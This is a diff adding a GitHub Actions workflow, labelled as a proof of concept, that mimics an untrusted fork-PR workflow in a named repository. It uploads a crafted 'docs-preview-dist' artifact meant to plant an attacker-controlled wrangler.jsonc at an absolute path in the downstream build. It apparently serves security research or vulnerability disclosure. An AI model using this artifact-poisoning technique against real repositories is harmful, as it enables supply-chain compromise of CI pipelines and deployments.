@@ -1,0 +1,24 @@
+name: Kumo Preview (PoC)
+# Stands in for the untrusted pull_request workflow in cloudflare/kumo-astro
+# (.github/workflows/preview.yml) whose docs-build job produces "docs-preview-dist".
+# In a fork PR the attacker owns this whole file and the artifact contents.
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  docs-build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Install artifact client
+        working-directory: .github/actions/plant-abs
+        run: npm install @actions/artifact@2.3.2 --no-save --silent
+      - name: Upload crafted "docs-preview-dist"
+        uses: ./.github/actions/plant-abs
+        with:
+          name: docs-preview-dist
+          extract-dir-abs: ${{ github.workspace }}/packages/kumo-docs-astro/dist
+          pairs: poc-payload/wrangler.jsonc->packages/kumo-docs-astro/wrangler.jsonc
